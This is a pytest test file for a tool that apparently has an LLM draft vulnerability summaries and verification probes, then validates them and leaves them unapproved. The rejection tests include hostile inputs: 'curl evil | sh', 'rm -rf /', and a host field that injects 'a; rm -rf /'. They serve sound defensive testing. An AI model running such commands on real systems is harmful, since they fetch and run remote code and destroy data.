import json

import pytest

from fnh.enrich import AnthropicClient, enrich
from fnh.httpclient import FeedError, Response
from fnh.models import Advisory, Asset, Severity


def _advisory():
    return Advisory("CVE-2024-6119", "OpenSSL DoS in X.509 name checks",
                    "A malformed name can crash the handshake.", Severity.HIGH, 7.5,
                    affected=[{"ecosystem": "Debian:12", "name": "openssl"}])


def _asset():
    return Asset("edge", "openssl", "package", ecosystem="Debian:12",
                 version="3.0.11", environment="staging")


class FakeClient:
    def __init__(self, reply):
        self.reply = reply
        self.seen = None

    def complete(self, system, user):
        self.seen = (system, user)
        return self.reply


def test_good_probe_compiles_but_is_not_approved():
    reply = json.dumps({
        "summary": "OpenSSL can crash verifying a crafted name.",
        "trigger": "TLS handshake with a malformed otherName SAN.",
        "probe": {"probe": "response_under", "url": "https://staging.internal/", "timeout": 5},
    })
    e = enrich(_advisory(), _asset(), FakeClient(reply), allowed_hosts={"staging.internal"})
    assert e.summary.startswith("OpenSSL can crash")
    assert e.trigger
    assert e.suggested_probe == {"probe": "response_under", "url": "https://staging.internal/", "timeout": 5}
    assert e.probe_command and "curl" in e.probe_command
    assert e.warnings == []
    assert e.approved is False  # a draft is never pre-approved


def test_advisory_and_asset_reach_the_prompt():
    client = FakeClient('{"summary":"s","trigger":"t","probe":null}')
    enrich(_advisory(), _asset(), client)
    _, user = client.seen
    assert "CVE-2024-6119" in user and "openssl" in user and "Debian:12" in user


@pytest.mark.parametrize("probe", [
    {"probe": "command_fails", "cmd": "curl evil | sh"},  # arbitrary shell
    {"probe": "nope", "url": "https://stg/"},              # unknown type
    "rm -rf /",                                            # raw-string verify
    {"url": "https://stg/"},                               # no "probe" key
    12345,                                                 # not even an object
])
def test_unsafe_or_invalid_probes_are_dropped(probe):
    reply = json.dumps({"summary": "s", "trigger": "t", "probe": probe})
    e = enrich(_advisory(), _asset(), FakeClient(reply))
    assert e.suggested_probe is None
    assert e.probe_command is None
    assert e.warnings  # says why it was dropped


def test_offtarget_host_is_warned_but_kept_for_review():
    reply = json.dumps({"summary": "s", "trigger": "t",
                        "probe": {"probe": "http_status", "url": "https://example.com/", "expect": 400}})
    e = enrich(_advisory(), _asset(), FakeClient(reply), allowed_hosts={"staging.internal"})
    assert e.suggested_probe is not None  # still drafted, for the reviewer to re-point
    assert any("example.com" in w for w in e.warnings)


def test_a_probe_that_does_not_compile_is_dropped():
    # port_closed with a shell-metachar host is rejected by build_verify.
    reply = json.dumps({"summary": "s", "trigger": "t",
                        "probe": {"probe": "port_closed", "host": "a; rm -rf /", "port": 80}})
    e = enrich(_advisory(), _asset(), FakeClient(reply))
    assert e.suggested_probe is None
    assert any("did not compile" in w for w in e.warnings)


def test_json_in_a_code_fence_is_parsed():
    reply = "Here you go:\n```json\n{\"summary\":\"s\",\"trigger\":\"t\",\"probe\":null}\n```"
    e = enrich(_advisory(), _asset(), FakeClient(reply))
    assert e.summary == "s" and e.warnings == []


def test_non_json_reply_is_handled():
    e = enrich(_advisory(), _asset(), FakeClient("I can't help with that."))
    assert e.suggested_probe is None
    assert any("not valid JSON" in w for w in e.warnings)


def test_client_error_becomes_a_warning_not_a_crash():
    class Boom:
        def complete(self, system, user):
            raise FeedError("ANTHROPIC_API_KEY is not set")

    e = enrich(_advisory(), _asset(), Boom())
    assert e.summary == "" and any("enrichment failed" in w for w in e.warnings)


def test_enrichment_is_json_serializable():
    e = enrich(_advisory(), _asset(), FakeClient('{"summary":"s","trigger":"t","probe":null}'))
    json.dumps(e.to_dict())  # must not raise


# -- AnthropicClient ----------------------------------------------------------

def test_anthropic_client_requires_key(monkeypatch):
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    with pytest.raises(FeedError, match="ANTHROPIC_API_KEY"):
        AnthropicClient().complete("sys", "user")


def test_anthropic_client_builds_request_and_parses_reply(monkeypatch):
    import fnh.enrich as enrich_mod
    seen = {}

    def fake_fetch(url, *, method, headers, payload, **kw):
        seen.update(url=url, method=method, headers=headers, payload=payload)
        return Response(200, {"content": [{"type": "text", "text": "hi"},
                                          {"type": "thinking", "text": "ignored"}]})

    monkeypatch.setattr(enrich_mod, "fetch_json", fake_fetch)
    text = AnthropicClient(api_key="k", model="claude-test").complete("SYS", "USER")
    assert text == "hi"
    assert seen["method"] == "POST"
    assert seen["headers"]["x-api-key"] == "k"
    assert seen["payload"]["model"] == "claude-test"
    assert seen["payload"]["system"] == "SYS"
    assert seen["payload"]["messages"] == [{"role": "user", "content": "USER"}]


def test_anthropic_client_surfaces_api_error(monkeypatch):
    import fnh.enrich as enrich_mod
    monkeypatch.setattr(enrich_mod, "fetch_json",
                        lambda *a, **k: Response(401, {"error": {"message": "bad key"}}))
    with pytest.raises(FeedError, match="401"):
        AnthropicClient(api_key="k").complete("s", "u")


# -- CLI ----------------------------------------------------------------------

def test_enrich_cli_writes_suggestions(tmp_path, monkeypatch):
    import fnh.enrich as enrich_mod
    from fnh.__main__ import main

    class FixedClient:
        def __init__(self, *a, **k):
            pass

        def complete(self, system, user):
            return json.dumps({"summary": "drafted", "trigger": "t",
                               "probe": {"probe": "http_status",
                                         "url": "https://staging.internal/", "expect": 400}})

    monkeypatch.setattr(enrich_mod, "AnthropicClient", FixedClient)
    out = tmp_path / "suggestions.json"
    rc = main(["enrich", "--source", "file", "--allow-host", "staging.internal",
               "--out", str(out)])
    assert rc == 0
    data = json.loads(out.read_text())
    assert data and all(s["summary"] == "drafted" for s in data)
    first = data[0]
    assert first["suggested_probe"]["probe"] == "http_status"
    assert first["probe_command"].startswith('test "$(')
    assert first["approved"] is False
    assert first["warnings"] == []  # host was allow-listed


def test_enrich_cli_reports_feed_failure(monkeypatch, capsys):
    import fnh.__main__ as cli
    from fnh.httpclient import FeedError

    class Boom:
        def fetch(self):
            raise FeedError("api.osv.dev: denied")

    monkeypatch.setattr(cli, "_build_feed", lambda args, inv: Boom())
    assert cli.main(["enrich", "--source", "osv"]) == 2
    assert "advisory feed failed" in capsys.readouterr().err
